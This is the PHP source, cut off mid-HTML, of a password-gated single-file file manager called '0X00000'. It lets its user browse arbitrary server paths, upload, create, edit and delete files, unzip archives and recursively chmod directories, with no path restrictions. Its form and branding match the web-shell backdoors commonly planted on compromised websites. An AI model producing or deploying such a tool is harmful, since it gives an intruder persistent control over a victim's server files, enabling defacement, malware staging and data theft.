<?php
session_start();

// ============ KONFIGURASI ============
$PASSWORD_HASH = 'b73cb43c53360a7585f869c9d7be35da9196d41c86e3aa2ab14720fc901bf90e';

// ============ FUNGSI AUTENTIKASI ============
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && hash('sha256', $_POST['password']) === $PASSWORD_HASH) {
        $_SESSION['authenticated'] = true;
    } else {
        showLoginForm();
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ============ FUNGSI UTILITAS ============
function getCurrentPath() {
    return isset($_GET['path']) ? realpath($_GET['path']) : realpath('.');
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getFilePermissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function showLoginForm() {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0X00000 - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 20% 80%, #5b21b6 0%, transparent 50%),
                        radial-gradient(circle at 80% 20%, #1e3a8a 0%, transparent 50%),
                        radial-gradient(circle at 40% 40%, #7c3aed 0%, transparent 50%);
            animation: float 20s ease-in-out infinite;
            opacity: 0.1;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(-20px, -20px) rotate(120deg); }
            66% { transform: translate(20px, -10px) rotate(240deg); }
        }
        
        .login-container {
            background: rgba(17, 17, 17, 0.95);
            padding: 48px;
            border-radius: 24px;
            box-shadow: 0 25px 80px rgba(124, 58, 237, 0.12),
                       0 0 0 1px rgba(124, 58, 237, 0.1);
            backdrop-filter: blur(20px);
            width: 90%;
            max-width: 420px;
            position: relative;
            z-index: 10;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            box-shadow: 0 10px 40px rgba(124, 58, 237, 0.3);
        }
        
        h2 {
            color: #ffffff;
            text-align: center;
            margin-bottom: 12px;
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        
        .subtitle {
            color: #6b7280;
            text-align: center;
            margin-bottom: 32px;
            font-size: 14px;
        }
        
        .input-group {
            margin-bottom: 24px;
        }
        
        label {
            color: #9ca3af;
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 14px 16px 14px 48px;
            background: rgba(31, 41, 55, 0.5);
            border: 2px solid rgba(55, 65, 81, 0.5);
            border-radius: 12px;
            color: #ffffff;
            font-size: 16px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        input[type="password"]:focus {
            outline: none;
            border-color: #7c3aed;
            background: rgba(31, 41, 55, 0.8);
            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.1);
        }
        
        input[type="password"]::placeholder {
            color: #4b5563;
        }
        
        button {
            width: 100%;
            padding: 14px 24px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 12px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.25);
            position: relative;
            overflow: hidden;
        }
        
        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.1);
            transform: translateX(-100%);
            transition: transform 0.6s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(124, 58, 237, 0.35);
        }
        
        button:hover::before {
            transform: translateX(0);
        }
        
        button:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔐</div>
        <h2>0X00000</h2>
        <p class="subtitle">Enter Your Password</p>
        <form method="POST">
            <div class="input-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <span class="input-icon">🔑</span>
                    <input type="password" name="password" id="password" placeholder="Enter your password" required autofocus>
                </div>
            </div>
            <button type="submit">Login →</button>
        </form>
    </div>
</body>
</html>
<?php
}

// ============ PROSES AKSI ============
$currentPath = getCurrentPath();
$message = '';
$messageType = '';

// Create Folder
if (isset($_POST['create_folder'])) {
    $folderName = trim($_POST['folder_name']);
    if (!empty($folderName)) {
        $newFolder = $currentPath . '/' . $folderName;
        if (!file_exists($newFolder)) {
            if (mkdir($newFolder, 0755, true)) {
                $message = 'Folder Success Created!';
                $messageType = 'success';
            } else {
                $message = 'Failed Create Folder!';
                $messageType = 'error';
            }
        } else {
            $message = 'Folder Exist!';
            $messageType = 'error';
        }
    }
}

// Create File
if (isset($_POST['create_file'])) {
    $fileName = trim($_POST['file_name']);
    $fileContent = $_POST['file_content'] ?? '';
    if (!empty($fileName)) {
        $newFile = $currentPath . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $fileContent) !== false) {
                $message = 'File Success Created!';
                $messageType = 'success';
            } else {
                $message = 'Failed Create File!';
                $messageType = 'error';
            }
        } else {
            $message = 'File Exist!';
            $messageType = 'error';
        }
    }
}

// Unzip File
if (isset($_POST['unzip_file'])) {
    $zipFile = $_POST['zip_file'];
    if (file_exists($zipFile)) {
        $zip = new ZipArchive;
        if ($zip->open($zipFile) === TRUE) {
            $extractPath = isset($_POST['extract_path']) && !empty($_POST['extract_path']) 
                ? $currentPath . '/' . $_POST['extract_path'] 
                : $currentPath;
            
            if (!is_dir($extractPath)) {
                mkdir($extractPath, 0755, true);
            }
            
            $zip->extractTo($extractPath);
            $zip->close();
            $message = 'ZIP File Success Unzip!';
            $messageType = 'success';
        } else {
            $message = 'Unzip File Failed!';
            $messageType = 'error';
        }
    } else {
        $message = 'ZIP File Not Found!';
        $messageType = 'error';
    }
}

// Upload File
if (isset($_FILES['upload'])) {
    $targetFile = $currentPath . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetFile)) {
        $message = 'File Success Uploaded!';
        $messageType = 'success';
    } else {
        $message = 'Failed Upload File!';
        $messageType = 'error';
    }
}

// Delete File/Folder
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if (is_dir($target)) {
        // Function to delete directory recursively
        function deleteDirectory($dir) {
            if (!file_exists($dir)) {
                return true;
            }
            if (!is_dir($dir)) {
                return unlink($dir);
            }
            foreach (scandir($dir) as $item) {
                if ($item == '.' || $item == '..') {
                    continue;
                }
                if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                    return false;
                }
            }
            return rmdir($dir);
        }
        
        if (deleteDirectory($target)) {
            $message = 'Folder Success Deleted!';
            $messageType = 'success';
        } else {
            $message = 'Failed Delete Folder!';
            $messageType = 'error';
        }
    } else {
        if (unlink($target)) {
            $message = 'File Success Deleted!';
            $messageType = 'success';
        } else {
            $message = 'Failed Delete File!';
            $messageType = 'error';
        }
    }
}

// Rename
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = $currentPath . '/' . $_POST['rename_old'];
    $new = $currentPath . '/' . $_POST['rename_new'];
    if (rename($old, $new)) {
        $message = 'Success Rename!';
        $messageType = 'success';
    } else {
        $message = 'Failed rename!';
        $messageType = 'error';
    }
}

// Chmod
if (isset($_POST['chmod_target']) && isset($_POST['chmod_value'])) {
    $target = $_POST['chmod_target'];
    $value = octdec($_POST['chmod_value']);
    
    if ($_POST['chmod_type'] === 'single_file' || $_POST['chmod_type'] === 'single_folder') {
        if (chmod($target, $value)) {
            $message = 'Chmod Success!';
            $messageType = 'success';
        } else {
            $message = 'Chmod Failed!';
            $messageType = 'error';
        }
    } elseif ($_POST['chmod_type'] === 'all') {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($currentPath)
        );
        $success = 0;
        foreach ($iterator as $item) {
            if (!in_array($item->getBasename(), ['.', '..'])) {
                if (chmod($item->getPathname(), $value)) $success++;
            }
        }
        $message = "Chmod Success at $success item!";
        $messageType = 'success';
    } elseif ($_POST['chmod_type'] === 'dirs') {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($currentPath)
        );
        $success = 0;
        foreach ($iterator as $item) {
            if ($item->isDir() && !in_array($item->getBasename(), ['.', '..'])) {
                if (chmod($item->getPathname(), $value)) $success++;
            }
        }
        $message = "Chmod Success at $success directory!";
        $messageType = 'success';
    } elseif ($_POST['chmod_type'] === 'files') {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($currentPath)
        );
        $success = 0;
        foreach ($iterator as $item) {
            if ($item->isFile()) {
                if (chmod($item->getPathname(), $value)) $success++;
            }
        }
        $message = "Chmod Success at $success file!";
        $messageType = 'success';
    }
}

// Save Edit File
if (isset($_POST['save_file']) && isset($_POST['file_content'])) {
    $file = $_POST['save_file'];
    if (file_put_contents($file, $_POST['file_content']) !== false) {
        $message = 'File Success Saved!';
        $messageType = 'success';
    } else {
        $message = 'Failed Save File!';
        $messageType = 'error';
    }
}

// Edit File Mode
$editMode = false;
$editContent = '';
$editFile = '';
if (isset($_GET['edit'])) {
    $editFile = realpath($_GET['edit']);
    if (is_file($editFile) && is_readable($editFile)) {
        $editMode = true;
        $editContent = file_get_contents($editFile);
    }
}

// Get Directory Contents - Separate files and folders
$files = [];
$folders = [];
$zipFiles = [];
if (is_dir($currentPath)) {
    $items = scandir($currentPath);
    $items = array_diff($items, ['.', '..']);
    
    foreach ($items as $item) {
        $itemPath = $currentPath . '/' . $item;
        if (is_dir($itemPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
            // Check for zip files
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            if ($ext === 'zip') {
                $zipFiles[] = $item;
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0X00000</title>
    <style>
        /* ===========================
           CSS VARIABLES & DESIGN SYSTEM
           =========================== */
        :root {
            /* Base Colors */
            --color-bg-primary: #0a0a0a;
            --color-bg-secondary: #111111;
            --color-bg-tertiary: #1a1a1a;
            --color-bg-elevated: #1f1f1f;
            
            /* Text Colors */
            --color-text-primary: #ffffff;
            --color-text-secondary: #a3a3a3;
            --color-text-muted: #737373;
            --color-text-disabled: #525252;
            
            /* Border Colors */
            --color-border-primary: #262626;
            --color-border-secondary: #333333;
            --color-border-hover: #404040;
            --color-border-focus: #525252;
            
            /* Brand Colors */
            --color-brand-primary: #7c3aed;
            --color-brand-secondary: #667eea;
            --color-brand-tertiary: #764ba2;
            --color-brand-gradient: linear-gradient(135deg, var(--color-brand-secondary) 0%, var(--color-brand-tertiary) 100%);
            
            /* State Colors */
            --color-success: #10b981;
            --color-success-bg: rgba(16, 185, 129, 0.1);
            --color-success-border: rgba(16, 185, 129, 0.3);
            
            --color-error: #ef4444;
            --color-error-bg: rgba(239, 68, 68, 0.1);
            --color-error-border: rgba(239, 68, 68, 0.3);
            
            --color-warning: #f59e0b;
            --color-warning-bg: rgba(245, 158, 11, 0.1);
            
            --color-info: #3b82f6;
            --color-info-bg: rgba(59, 130, 246, 0.1);
            --color-info-border: rgba(59, 130, 246, 0.3);
            
            /* Effects */
            --color-hover-overlay: rgba(124, 58, 237, 0.05);
            --color-focus-ring: rgba(124, 58, 237, 0.1);
            
            /* Shadows */
            --shadow-xs: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --shadow-sm: 0 2px 4px -1px rgb(0 0 0 / 0.1);
            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1);
            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1);
            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1);
            --shadow-2xl: 0 25px 50px -12px rgb(0 0 0 / 0.25);
            --shadow-brand: 0 4px 15px rgba(124, 58, 237, 0.25);
            
            /* Border Radius */
            --radius-xs: 4px;
            --radius-sm: 6px;
            --radius-md: 8px;
            --radius-lg: 12px;
            --radius-xl: 16px;
            --radius-2xl: 24px;
            --radius-full: 9999px;
            
            /* Spacing */
            --spacing-xs: 4px;
            --spacing-sm: 8px;
            --spacing-md: 12px;
            --spacing-lg: 16px;
            --spacing-xl: 20px;
            --spacing-2xl: 24px;
            --spacing-3xl: 32px;
            --spacing-4xl: 48px;
            
            /* Typography */
            --font-family-base: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            --font-family-mono: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', monospace;
            
            --font-size-xs: 11px;
            --font-size-sm: 12px;
            --font-size-md: 14px;
            --font-size-lg: 16px;
            --font-size-xl: 18px;
            --font-size-2xl: 24px;
            --font-size-3xl: 32px;
            
            --font-weight-normal: 400;
            --font-weight-medium: 500;
            --font-weight-semibold: 600;
            --font-weight-bold: 700;
            
            --line-height-tight: 1.25;
            --line-height-normal: 1.6;
            --line-height-relaxed: 1.75;
            
            /* Transitions */
            --transition-fast: 150ms cubic-bezier(0.4, 0, 0.2, 1);
            --transition-base: 200ms cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: 300ms cubic-bezier(0.4, 0, 0.2, 1);
            
            /* Z-Index */
            --z-base: 0;
            --z-dropdown: 10;
            --z-sticky: 20;
            --z-overlay: 30;
            --z-modal: 40;
            --z-popover: 50;
            --z-tooltip: 60;
        }
        
        /* ===========================
           RESET & BASE STYLES
           =========================== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: var(--font-family-base);
            font-size: var(--font-size-md);
            line-height: var(--line-height-normal);
            color: var(--color-text-primary);
            background: var(--color-bg-primary);
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        /* ===========================
           LAYOUT COMPONENTS
           =========================== */
        
        /* Header */
        .header {
            background: var(--color-bg-secondary);
            border-bottom: 1px solid var(--color-border-primary);
            position: sticky;
            top: 0;
            z-index: var(--z-sticky);
            backdrop-filter: blur(10px);
            background: rgba(17, 17, 17, 0.95);
        }
        
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: var(--spacing-xl) var(--spacing-2xl);
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: var(--spacing-xl);
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
        }
        
        .logo-icon {
            width: 40px;
            height: 40px;
            background: var(--color-brand-gradient);
            border-radius: var(--radius-md);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            box-shadow: var(--shadow-brand);
        }
        
        .logo-text {
            font-size: var(--font-size-2xl);
            font-weight: var(--font-weight-bold);
            letter-spacing: -0.5px;
            background: var(--color-brand-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        /* Container */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: var(--spacing-2xl);
        }
        
        /* ===========================
           UI COMPONENTS
           =========================== */
        
        /* Path Bar */
        .path-bar {
            background: var(--color-bg-secondary);
            border: 1px solid var(--color-border-primary);
            border-radius: var(--radius-lg);
            padding: var(--spacing-lg) var(--spacing-xl);
            margin-bottom: var(--spacing-2xl);
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
        }
        
        .path-label {
            color: var(--color-text-muted);
            font-size: var(--font-size-sm);
            font-weight: var(--font-weight-medium);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .path-text {
            color: var(--color-brand-primary);
            font-family: var(--font-family-mono);
            font-size: var(--font-size-md);
            background: var(--color-bg-tertiary);
            padding: var(--spacing-sm) var(--spacing-md);
            border-radius: var(--radius-sm);
            border: 1px solid var(--color-border-primary);
        }
        
        /* Messages */
        .message {
            padding: var(--spacing-lg) var(--spacing-xl);
            border-radius: var(--radius-lg);
            margin-bottom: var(--spacing-2xl);
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            animation: slideDown var(--transition-slow);
            border: 1px solid;
            font-weight: var(--font-weight-medium);
        }
        
        .message.success {
            background: var(--color-success-bg);
            border-color: var(--color-success);
            color: var(--color-success);
        }
        
        .message.error {
            background: var(--color-error-bg);
            border-color: var(--color-error);
            color: var(--color-error);
        }
        
        .message::before {
            font-size: 20px;
        }
        
        .message.success::before { content: '✓'; }
        .message.error::before { content: '✕'; }
        
        /* Buttons */
        .btn {
            padding: var(--spacing-sm) var(--spacing-lg);
            border-radius: var(--radius-md);
            font-size: var(--font-size-md);
            font-weight: var(--font-weight-semibold);
            cursor: pointer;
            transition: all var(--transition-base);
            border: none;
            display: inline-flex;
            align-items: center;
            gap: var(--spacing-sm);
            white-space: nowrap;
        }
        
        .btn-primary {
            background: var(--color-brand-gradient);
            color: var(--color-text-primary);
        }
        
        .btn-primary:hover {
            transform: translateY(-1px);
            box-shadow: var(--shadow-brand);
        }
        
        .btn-secondary {
            background: var(--color-bg-tertiary);
            color: var(--color-text-secondary);
            border: 1px solid var(--color-border-primary);
        }
        
        .btn-secondary:hover {
            background: var(--color-bg-elevated);
            border-color: var(--color-border-hover);
        }
        
        .btn-danger {
            background: var(--color-error-bg);
            color: var(--color-error);
            border: 1px solid var(--color-error-border);
        }
        
        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.2);
        }
        
        .btn-sm {
            padding: var(--spacing-xs) var(--spacing-md);
            font-size: var(--font-size-sm);
        }
        
        /* Form Elements */
        .form-control {
            padding: var(--spacing-sm) var(--spacing-md);
            background: var(--color-bg-primary);
            border: 1px solid var(--color-border-primary);
            border-radius: var(--radius-md);
            color: var(--color-text-primary);
            font-size: var(--font-size-md);
            transition: all var(--transition-base);
            width: 100%;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--color-brand-primary);
            box-shadow: 0 0 0 3px var(--color-focus-ring);
        }
        
        .form-control::placeholder {
            color: var(--color-text-disabled);
        }
        
        select.form-control {
            cursor: pointer;
        }
        
        input[type="file"].form-control {
            padding: var(--spacing-sm) var(--spacing-md);
            cursor: pointer;
        }
        
        textarea.form-control {
            resize: vertical;
            min-height: 100px;
            font-family: var(--font-family-mono);
        }
        
        .form-group {
            display: flex;
            gap: var(--spacing-sm);
            align-items: center;
        }
        
        .form-group-vertical {
            display: flex;
            flex-direction: column;
            gap: var(--spacing-sm);
        }
        
        /* ===========================
           ACTIONS PANEL
           =========================== */
        .actions-panel {
            background: var(--color-bg-secondary);
            border: 1px solid var(--color-border-primary);
            border-radius: var(--radius-xl);
            padding: var(--spacing-2xl);
            margin-bottom: var(--spacing-3xl);
        }
        
        .section-title {
            color: var(--color-text-primary);
            font-size: var(--font-size-lg);
            font-weight: var(--font-weight-semibold);
            margin-bottom: var(--spacing-xl);
            padding-bottom: var(--spacing-md);
            border-bottom: 1px solid var(--color-border-primary);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }
        
        .section-title-icon {
            font-size: 20px;
        }
        
        /* Action Categories */
        .action-category {
            margin-bottom: var(--spacing-2xl);
        }
        
        .action-category:last-child {
            margin-bottom: 0;
        }
        
        .category-title {
            color: var(--color-text-secondary);
            font-size: var(--font-size-sm);
            font-weight: var(--font-weight-semibold);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: var(--spacing-md);
            padding-left: var(--spacing-xs);
        }
        
        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
            gap: var(--spacing-lg);
        }
        
        .action-card {
            background: var(--color-bg-tertiary);
            border: 1px solid var(--color-border-primary);
            border-radius: var(--radius-lg);
            padding: var(--spacing-xl);
            transition: all var(--transition-base);
        }
        
        .action-card:hover {
            border-color: var(--color-border-hover);
            background: var(--color-hover-overlay);
        }
        
        .action-header {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-lg);
        }
        
        .action-icon {
            width: 32px;
            height: 32px;
            background: var(--color-brand-gradient);
            border-radius: var(--radius-md);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .action-title {
            color: var(--color-text-primary);
            font-size: var(--font-size-md);
            font-weight: var(--font-weight-semibold);
        }
        
        /* ===========================
           FILE TABLE
           =========================== */
        .file-table {
            background: var(--color-bg-secondary);
            border: 1px solid var(--color-border-primary);
            border-radius: var(--radius-xl);
            overflow: hidden;
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .table thead {
            background: var(--color-bg-tertiary);
            border-bottom: 1px solid var(--color-border-primary);
        }
        
        .table th {
            padding: var(--spacing-lg) var(--spacing-xl);
            text-align: left;
            color: var(--color-text-muted);
            font-weight: var(--font-weight-semibold);
            font-size: var(--font-size-xs);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .table td {
            padding: var(--spacing-md) var(--spacing-xl);
            border-bottom: 1px solid rgba(38, 38, 38, 0.5);
            font-size: var(--font-size-md);
        }
        
        .table tbody tr {
            transition: background var(--transition-base);
        }
        
        .table tbody tr:hover {
            background: var(--color-hover-overlay);
        }
        
        .table tbody tr:last-child td {
            border-bottom: none;
        }
        
        .file-name {
            color: var(--color-text-primary);
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: var(--spacing-sm);
            font-weight: var(--font-weight-medium);
            transition: color var(--transition-base);
        }
        
        .file-name:hover {
            color: var(--color-brand-primary);
        }
        
        .file-icon {
            font-size: 18px;
            width: 24px;
            text-align: center;
        }
        
        .file-size {
            color: var(--color-text-secondary);
            font-size: var(--font-size-sm);
        }
        
        .permissions-badge {
            font-family: var(--font-family-mono);
            font-size: var(--font-size-xs);
            color: var(--color-success);
            background: var(--color-success-bg);
            padding: var(--spacing-xs) var(--spacing-sm);
            border-radius: var(--radius-sm);
            font-weight: var(--font-weight-medium);
        }
        
        .file-date {
            color: var(--color-text-secondary);
            font-size: var(--font-size-sm);
        }
        
        .file-actions {
            display: flex;
            gap: var(--spacing-xs);
        }
        
        .zip-badge {
            background: var(--color-info-bg);
            color: var(--color-info);
            padding: 2px 6px;
            border-radius: var(--radius-xs);
            font-size: var(--font-size-xs);
            font-weight: var(--font-weight-semibold);
            margin-left: var(--spacing-sm);
        }
        
        /* ===========================
           EDIT MODAL
           =========================== */
        .edit-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(4px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: var(--z-modal);
            animation: fadeIn var(--transition-base);
        }
        
        .edit-container {
            background: var(--color-bg-secondary);
            width: 90%;
            max-width: 1000px;
            max-height: 85vh;
            border-radius: var(--radius-xl);
            border: 1px solid var(--color-border-primary);
            display: flex;
            flex-direction: column;
            animation: slideUp var(--transition-slow);
        }
        
        .edit-header {
            padding: var(--spacing-2xl);
            border-bottom: 1px solid var(--color-border-primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .edit-title {
            font-size: var(--font-size-xl);
            font-weight: var(--font-weight-semibold);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }
        
        .edit-body {
            padding: var(--spacing-2xl);
            flex: 1;
            overflow: auto;
        }
        
        .edit-textarea {
            width: 100%;
            height: 450px;
            padding: var(--spacing-lg);
            background: var(--color-bg-primary);
            border: 1px solid var(--color-border-primary);
            border-radius: var(--radius-lg);
            color: var(--color-text-primary);
            font-family: var(--font-family-mono);
            font-size: var(--font-size-md);
            line-height: var(--line-height-relaxed);
            resize: vertical;
            transition: all var(--transition-base);
        }
        
        .edit-textarea:focus {
            outline: none;
            border-color: var(--color-brand-primary);
            box-shadow: 0 0 0 3px var(--color-focus-ring);
        }
        
        .edit-footer {
            padding: var(--spacing-xl) var(--spacing-2xl);
            border-top: 1px solid var(--color-border-primary);
            display: flex;
            justify-content: flex-end;
            gap: var(--spacing-md);
        }
        
        /* ===========================
           ANIMATIONS
           =========================== */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* ===========================
           RESPONSIVE DESIGN
           =========================== */
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                align-items: stretch;
                padding: var(--spacing-lg);
            }
            
            .logo {
                justify-content: center;
            }
            
            .container {
                padding: var(--spacing-lg);
            }
            
            .actions-grid {
                grid-template-columns: 1fr;
            }
            
            .file-table {
                overflow-x: auto;
            }
            
            .table {
                min-width: 700px;
            }
            
            .edit-container {
                width: 95%;
                max-height: 90vh;
            }
            
            .edit-textarea {
                height: 350px;
            }
        }
        
        /* ===========================
           SCROLLBAR STYLING
           =========================== */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--color-bg-secondary);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--color-border-primary);
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--color-border-hover);
        }
        
        /* ===========================
           UTILITY CLASSES
           =========================== */
        .text-muted {
            color: var(--color-text-muted);
        }
        
        .text-small {
            font-size: var(--font-size-sm);
        }
        
        .font-mono {
            font-family: var(--font-family-mono);
        }
        
        .mt-2 { margin-top: var(--spacing-md); }
        .mb-2 { margin-bottom: var(--spacing-md); }
        .ml-2 { margin-left: var(--spacing-md); }
        .mr-2 { margin-right: var(--spacing-md); }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <div class="logo-icon">📁</div>
                <h1 class="logo-text">0X00000</h1>
            </div>
            <a href="?logout" class="btn btn-danger">
                <span>🔓</span>
                <span>Logout</span>
            </a>
        </div>
    </div>
    
    <div class="container">
        <div class="path-bar">
            <span class="path-label">Current Path</span>
            <span class="path-text"><?php echo htmlspecialchars($currentPath); ?></span>
        </div>
        
        <?php if ($message): ?>
        <div class="message <?php echo $messageType; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
        <?php endif; ?>
        
        <?php if ($editMode): ?>
        <div class="edit-modal">
            <div class="edit-container">
                <div class="edit-header">
                    <h2 class="edit-title">
                        <span>📝</span>
                        Edit File: <?php echo basename($editFile); ?>
                    </h2>
                </div>
                <form method="POST" style="display: contents;">
                    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars($editFile); ?>">
                    <div class="edit-body">
                        <textarea name="file_content" class="edit-textarea"><?php echo htmlspecialchars($editContent); ?></textarea>
                    </div>
                    <div class="edit-footer">
                        <a href="?path=<?php echo urlencode($currentPath); ?>" class="btn btn-secondary">Cancel</a>
                        <button type="submit" class="btn btn-primary">💾 Save Changes</button>
                    </div>
                </form>
            </div>
        </div>
        <?php else: ?>
        
        <div class="actions-panel">
            <h2 class="section-title">
                <span class="section-title-icon">⚡</span>
                Quick Actions
            </h2>
            
            <!-- File Operations -->
            <div class="action-category">
                <div class="category-title">File Operations</div>
                <div class="actions-grid">
                    <!-- Upload File -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">⬆️</div>
                            <div class="action-title">Upload File</div>
                        </div>
                        <form method="POST" enctype="multipart/form-data" class="form-group">
                            <input type="file" name="upload" class="form-control" required>
                            <button type="submit" class="btn btn-primary">Upload</button>
                        </form>
                    </div>
                    
                    <!-- Create Folder -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">➕</div>
                            <div class="action-title">Create Folder</div>
                        </div>
                        <form method="POST" class="form-group">
                            <input type="text" name="folder_name" class="form-control" placeholder="Folder name" required>
                            <button type="submit" name="create_folder" class="btn btn-primary">Create</button>
                        </form>
                    </div>
                    
                    <!-- Create File -->
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">📝</div>
                            <div class="action-title">Create File</div>
                        </div>
                        <form method="POST" class="form-group-vertical">
                            <input type="text" name="file_name" class="form-control" placeholder="File name (e.g., index.html)" required>
                            <textarea name="file_content" class="form-control" placeholder="File content (optional)"></textarea>
                            <button type="submit" name="create_file" class="btn btn-primary">Create</button>
                        </form>
                    </div>
                    
                    <!-- Unzip File -->
                    <?php if (count($zipFiles) > 0): ?>
                    <div class="action-card">
                        <div class="action-header">
                            <div class="action-icon">📦</div>
                            <div class="action-title">Unzip File</div>
                        </div>
                        <form method="POST" class="form-group-vertical">
                            <select name="zip_file" class="form-control" required>
                                <option value="">Select zip file...</option>
                                <?php foreach ($zipFiles as $zipFile): ?>
                                <option value="<?php echo $currentPath . '/' . $zipFile; ?>">
